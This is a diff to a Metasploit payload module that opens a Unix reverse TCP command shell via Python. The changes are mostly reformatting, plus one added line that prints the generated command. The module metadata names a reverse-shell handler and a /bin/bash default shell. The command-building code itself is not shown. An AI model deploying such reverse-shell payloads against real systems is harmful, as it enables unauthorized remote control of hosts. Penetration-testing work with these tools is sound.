@@ -8,7 +8,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -16,25 +15,25 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',
-      'Version'     => '$Revision: 1 $',
-      'Description' => 'Connect back and create a command shell via Python',
-      'Author'      => 'bcoles',
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'unix',
-      'Arch'        => ARCH_CMD,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::CommandShell,
-      'PayloadType' => 'cmd',
-      'RequiredCmd' => 'python',
-      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
-    ))
+                     'Name' => 'Unix Command Shell, Reverse TCP (via Python)',
+                     'Version' => '$Revision: 1 $',
+                     'Description' => 'Connect back and create a command shell via Python',
+                     'Author' => 'bcoles',
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'unix',
+                     'Arch' => ARCH_CMD,
+                     'Handler' => Msf::Handler::ReverseTcp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'RequiredCmd' => 'python',
+                     'Payload' => { 'Offsets' => {}, 'Payload' => '' }))
     register_options([
-      OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
-    ])
+                       OptString.new('SHELL', [true, 'The system shell to use.', '/bin/bash'])
+                     ])
   end
 
   def generate
+    vprint_good(command_string)
     return super + command_string
   end
 
@@ -43,7 +42,7 @@ module MetasploitModule
   #
 
   def random_padding
-    " "*rand(10)
+    " " * rand(10)
   end
 
   #
